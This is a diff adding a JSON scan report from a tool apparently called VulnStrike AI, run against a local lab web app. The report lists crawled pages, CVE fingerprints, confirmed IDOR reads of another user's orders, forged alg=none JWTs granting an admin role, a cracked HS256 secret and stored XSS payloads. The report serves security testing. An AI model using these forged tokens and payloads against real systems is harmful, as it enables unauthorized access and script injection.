@@ -1,0 +1,547 @@
+{
+  "project": "VulnStrike AI",
+  "generated_at": "2026-10-24T11:35:57.150239+00:00",
+  "subsystems": {
+    "crawler": {
+      "pages": [
+        {
+          "url": "http://127.0.0.1:50698/",
+          "status_code": 200,
+          "depth": 0,
+          "forms": [],
+          "cookies": [
+            {
+              "name": "visitor_track",
+              "value": "lab_vis_01",
+              "domain": "127.0.0.1",
+              "path": "/",
+              "httpOnly": false,
+              "secure": false,
+              "sameSite": "Lax",
+              "expires": -1
+            }
+          ],
+          "api_calls": [
+            {
+              "method": "GET",
+              "url": "http://127.0.0.1:50698/api/stats",
+              "resource_type": "fetch"
+            }
+          ],
+          "error": null
+        },
+        {
+          "url": "http://127.0.0.1:50698/login",
+          "status_code": 200,
+          "depth": 1,
+          "forms": [
+            {
+              "action": "http://127.0.0.1:50698/api/login",
+              "method": "POST",
+              "inputs": [
+                {
+                  "name": "username",
+                  "type": "text",
+                  "id": "username-input"
+                },
+                {
+                  "name": "password",
+                  "type": "password",
+                  "id": "password-input"
+                },
+                {
+                  "name": null,
+                  "type": "submit",
+                  "id": "login-btn"
+                }
+              ]
+            }
+          ],
+          "cookies": [
+            {
+              "name": "visitor_track",
+              "value": "lab_vis_01",
+              "domain": "127.0.0.1",
+              "path": "/",
+              "httpOnly": false,
+              "secure": false,
+              "sameSite": "Lax",
+              "expires": -1
+            }
+          ],
+          "api_calls": [],
+          "error": null
+        },
+        {
+          "url": "http://127.0.0.1:50698/search",
+          "status_code": 200,
+          "depth": 1,
+          "forms": [
+            {
+              "action": "http://127.0.0.1:50698/search",
+              "method": "GET",
+              "inputs": [
+                {
+                  "name": "q",
+                  "type": "text",
+                  "id": "search-box"
+                },
+                {
+                  "name": null,
+                  "type": "submit",
+                  "id": "search-submit"
+                }
+              ]
+            }
+          ],
+          "cookies": [
+            {
+              "name": "visitor_track",
+              "value": "lab_vis_01",
+              "domain": "127.0.0.1",
+              "path": "/",
+              "httpOnly": false,
+              "secure": false,
+              "sameSite": "Lax",
+              "expires": -1
+            }
+          ],
+          "api_calls": [],
+          "error": null
+        },
+        {
+          "url": "http://127.0.0.1:50698/feedback",
+          "status_code": 200,
+          "depth": 1,
+          "forms": [
+            {
+              "action": "http://127.0.0.1:50698/api/comments",
+              "method": "POST",
+              "inputs": [
+                {
+                  "name": "author",
+                  "type": "text",
+                  "id": "author-input"
+                },
+                {
+                  "name": "comment",
+                  "type": "textarea",
+                  "id": "comment-input"
+                },
+                {
+                  "name": null,
+                  "type": "submit",
+                  "id": "submit-comment"
+                }
+              ]
+            }
+          ],
+          "cookies": [
+            {
+              "name": "visitor_track",
+              "value": "lab_vis_01",
+              "domain": "127.0.0.1",
+              "path": "/",
+              "httpOnly": false,
+              "secure": false,
+              "sameSite": "Lax",
+              "expires": -1
+            }
+          ],
+          "api_calls": [],
+          "error": null
+        },
+        {
+          "url": "http://127.0.0.1:50698/comments",
+          "status_code": 200,
+          "depth": 1,
+          "forms": [],
+          "cookies": [
+            {
+              "name": "visitor_track",
+              "value": "lab_vis_01",
+              "domain": "127.0.0.1",
+              "path": "/",
+              "httpOnly": false,
+              "secure": false,
+              "sameSite": "Lax",
+              "expires": -1
+            }
+          ],
+          "api_calls": [
+            {
+              "method": "GET",
+              "url": "http://127.0.0.1:50698/api/comments",
+              "resource_type": "fetch"
+            }
+          ],
+          "error": null
+        },
+        {
+          "url": "http://127.0.0.1:50698/broken-route",
+          "status_code": 404,
+          "depth": 1,
+          "forms": [],
+          "cookies": [
+            {
+              "name": "visitor_track",
+              "value": "lab_vis_01",
+              "domain": "127.0.0.1",
+              "path": "/",
+              "httpOnly": false,
+              "secure": false,
+              "sameSite": "Lax",
+              "expires": -1
+            }
+          ],
+          "api_calls": [],
+          "error": null
+        }
+      ]
+    },
+    "cve_fingerprinter": [
+      {
+        "technology": "nginx",
+        "version": "1.18.0",
+        "source": "header:Server",
+        "cves": [
+          {
+            "id": "CVE-2021-23017",
+            "cvss": 7.7,
+            "has_public_exploit": true
+          }
+        ]
+      },
+      {
+        "technology": "PHP",
+        "version": "8.1.2",
+        "source": "header:X-Powered-By",
+        "cves": [
+          {
+            "id": "CVE-2021-21708",
+            "cvss": 9.8,
+            "has_public_exploit": true
+          }
+        ]
+      },
+      {
+        "technology": "WordPress",
+        "version": "6.4.1",
+        "source": "meta:generator",
+        "cves": [
+          {
+            "id": "CVE-2024-4439",
+            "cvss": 7.2,
+            "has_public_exploit": false
+          }
+        ]
+      },
+      {
+        "technology": "jquery",
+        "version": "3.4.1",
+        "source": "script:src",
+        "cves": [
+          {
+            "id": "CVE-2020-11022",
+            "cvss": 6.1,
+            "has_public_exploit": true
+          },
+          {
+            "id": "CVE-2020-11023",
+            "cvss": 6.1,
+            "has_public_exploit": false
+          }
+        ]
+      }
+    ],
+    "auth_exploits": {
+      "idor": {
+        "module": "idor_tester",
+        "base_url": "http://127.0.0.1:50698",
+        "user_a": "alice",
+        "user_b": "bob",
+        "summary": {
+          "total_tested": 7,
+          "vulnerable_count": 2
+        },
+        "findings": [
+          {
+            "url": "http://127.0.0.1:50698/api/orders/201",
+            "pattern": "/api/orders/{id}",
+            "resource_id": "201",
+            "vulnerable": false,
+            "verdict": "skipped_user_a_not_authorized",
+            "similarity": 0.0,
+            "reason": "User A could not access baseline resource (HTTP 404); resource may not exist or is not owned by User A.",
+            "user_a_status": 404,
+            "user_b_status": 404,
+            "user_a_preview": "{\"error\": \"Not found\"}",
+            "user_b_preview": "{\"error\": \"Not found\"}"
+          },
+          {
+            "url": "http://127.0.0.1:50698/api/orders/101",
+            "pattern": "/api/orders/{id}",
+            "resource_id": "101",
+            "vulnerable": true,
+            "verdict": "vulnerable_exact_match",
+            "similarity": 1.0,
+            "reason": "User B received HTTP 2xx with the exact same private payload returned to User A.",
+            "user_a_status": 200,
+            "user_b_status": 200,
+            "user_a_preview": "{\"id\": 101, \"owner\": \"alice\", \"item\": \"Hardware Security Key\", \"total\": 89.99, \"owner_email\": \"alice@lab.local\"}",
+            "user_b_preview": "{\"id\": 101, \"owner\": \"alice\", \"item\": \"Hardware Security Key\", \"total\": 89.99, \"owner_email\": \"alice@lab.local\"}"
+          },
+          {
+            "url": "http://127.0.0.1:50698/api/orders/102",
+            "pattern": "/api/orders/{id}",
+            "resource_id": "102",
+            "vulnerable": true,
+            "verdict": "vulnerable_exact_match",
+            "similarity": 1.0,
+            "reason": "User B received HTTP 2xx with the exact same private payload returned to User A.",
+            "user_a_status": 200,
+            "user_b_status": 200,
+            "user_a_preview": "{\"id\": 102, \"owner\": \"bob\", \"item\": \"USB Logic Analyzer\", \"total\": 149.0, \"owner_email\": \"bob@lab.local\"}",
+            "user_b_preview": "{\"id\": 102, \"owner\": \"bob\", \"item\": \"USB Logic Analyzer\", \"total\": 149.0, \"owner_email\": \"bob@lab.local\"}"
+          },
+          {
+            "url": "http://127.0.0.1:50698/api/invoices/201",
+            "pattern": "/api/invoices/{id}",
+            "resource_id": "201",
+            "vulnerable": false,
+            "verdict": "properly_protected",
+            "similarity": 0.0,
+            "reason": "Access denied to User B (HTTP 403).",
+            "user_a_status": 200,
+            "user_b_status": 403,
+            "user_a_preview": "{\"id\": 201, \"owner\": \"alice\", \"amount\": 89.99, \"card_last4\": \"4242\"}",
+            "user_b_preview": "{\"error\": \"Forbidden\"}"
+          },
+          {
+            "url": "http://127.0.0.1:50698/api/invoices/101",
+            "pattern": "/api/invoices/{id}",
+            "resource_id": "101",
+            "vulnerable": false,
+            "verdict": "skipped_user_a_not_authorized",
+            "similarity": 0.0,
+            "reason": "User A could not access baseline resource (HTTP 404); resource may not exist or is not owned by User A.",
+            "user_a_status": 404,
+            "user_b_status": 404,
+            "user_a_preview": "{\"error\": \"Not found\"}",
+            "user_b_preview": "{\"error\": \"Not found\"}"
+          },
+          {
+            "url": "http://127.0.0.1:50698/api/invoices/102",
+            "pattern": "/api/invoices/{id}",
+            "resource_id": "102",
+            "vulnerable": false,
+            "verdict": "skipped_user_a_not_authorized",
+            "similarity": 0.0,
+            "reason": "User A could not access baseline resource (HTTP 404); resource may not exist or is not owned by User A.",
+            "user_a_status": 404,
+            "user_b_status": 404,
+            "user_a_preview": "{\"error\": \"Not found\"}",
+            "user_b_preview": "{\"error\": \"Not found\"}"
+          },
+          {
+            "url": "http://127.0.0.1:50698/api/me",
+            "pattern": "/api/me",
+            "resource_id": null,
+            "vulnerable": false,
+            "verdict": "different_user_scoped_data",
+            "similarity": 0.1,
+            "reason": "User B received HTTP 2xx, but response content differed from User A's private record (likely session-scoped endpoint).",
+            "user_a_status": 200,
+            "user_b_status": 200,
+            "user_a_preview": "{\"username\": \"alice\", \"email\": \"alice@lab.local\"}",
+            "user_b_preview": "{\"username\": \"bob\", \"email\": \"bob@lab.local\"}"
+          }
+        ]
+      },
+      "jwt": {
+        "module": "jwt_inspector",
+        "decoded": {
+          "header": {
+            "alg": "HS256",
+            "typ": "JWT"
+          },
+          "payload": {
+            "sub": "alice",
+            "role": "user"
+          },
+          "signature_present": true,
+          "observations": [
+            "Token uses symmetric HMAC (HS256); susceptible to offline secret guessing if weak.",
+            "Missing 'exp' expiration claim (token never expires)."
+          ]
+        },
+        "alg_none_test": {
+          "tested": true,
+          "endpoint_url": "http://127.0.0.1:50698/api/jwt-protected",
+          "enforces_signature_baseline": true,
+          "valid_token_status": 200,
+          "corrupted_signature_status": 401,
+          "vulnerable": true,
+          "accepted_variants": [
+            {
+              "variant": "alg=none (trailing_dot)",
+              "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=none (no_trailing_dot)",
+              "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=None (trailing_dot)",
+              "forged_token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=None (no_trailing_dot)",
+              "forged_token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=NONE (trailing_dot)",
+              "forged_token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=NONE (no_trailing_dot)",
+              "forged_token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            }
+          ],
+          "all_probes": [
+            {
+              "variant": "alg=none (trailing_dot)",
+              "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=none (no_trailing_dot)",
+              "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=None (trailing_dot)",
+              "forged_token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=None (no_trailing_dot)",
+              "forged_token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=NONE (trailing_dot)",
+              "forged_token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            },
+            {
+              "variant": "alg=NONE (no_trailing_dot)",
+              "forged_token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+              "status_code": 200,
+              "accepted": true,
+              "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+            }
+          ]
+        },
+        "secret_guessing": {
+          "attempted": true,
+          "cracked": true,
+          "secret": "vulnstrike-lab-secret",
+          "algorithm": "HS256",
+          "wordlist": "C:\\Users\\acer\\Downloads\\vulnstrike_ai\\vulnstrike\\examples\\sample_wordlist.txt",
+          "attempts": 8,
+          "elapsed_ms": 1.8
+        }
+      },
+      "xss": {
+        "module": "xss_verifier",
+        "target_url": "http://127.0.0.1:50698/feedback",
+        "verify_url": "http://127.0.0.1:50698/comments",
+        "summary": {
+          "total_cases": 2,
+          "confirmed_count": 2
+        },
+        "findings": [
+          {
+            "target_url": "http://127.0.0.1:50698/feedback",
+            "verify_url": "http://127.0.0.1:50698/comments",
+            "final_url": "http://127.0.0.1:50698/comments",
+            "input_selector": "#comment-input",
+            "payload": "<img src=\"x\" onerror=\"alert('StoredXSS')\">",
+            "confirmed": true,
+            "detection_methods": [
+              "dialog_event",
+              "dom_mutation"
+            ],
+            "dialogs": [
+              {
+                "type": "alert",
+                "message": "StoredXSS"
+              }
+            ],
+            "dom_mutations": [
+              {
+                "tag": "img",
+                "id": null,
+                "reason": "inline_js_attribute:onerror=alert('StoredXSS')",
+                "outer_html": "<img src=\"x\" onerror=\"alert('StoredXSS')\">"
+              }
+            ],
+            "screenshot": "C:\\Users\\acer\\Downloads\\vulnstrike_ai\\vulnstrike\\sample_outputs\\screenshots\\xss_001_comment-input_20261024T113550Z.png",
+            "error": null
+          },
+          {
+            "target_url": "http://127.0.0.1:50698/feedback",
+            "verify_url": "http://127.0.0.1:50698/comments",
+            "final_url": "http://127.0.0.1:50698/comments",
+            "input_selector": "#comment-input",
+            "payload": "<svg id=\"xss-canary\" data-xss=\"1\"></svg>",
+            "confirmed": true,
+            "detection_methods": [
+              "dom_mutation"
+            ],
+            "dialogs": [],
+            "dom_mutations": [
+              {
+                "tag": "svg",
+                "id": "xss-canary",
+                "reason": "dangerous_element:svg",
+                "outer_html": "<svg id=\"xss-canary\" data-xss=\"1\"></svg>"
+              }
+            ],
+            "screenshot": "C:\\Users\\acer\\Downloads\\vulnstrike_ai\\vulnstrike\\sample_outputs\\screenshots\\xss_002_comment-input_20261024T113552Z.png",
+            "error": null
+          }
+        ]
+      }
+    }
+  }
+}
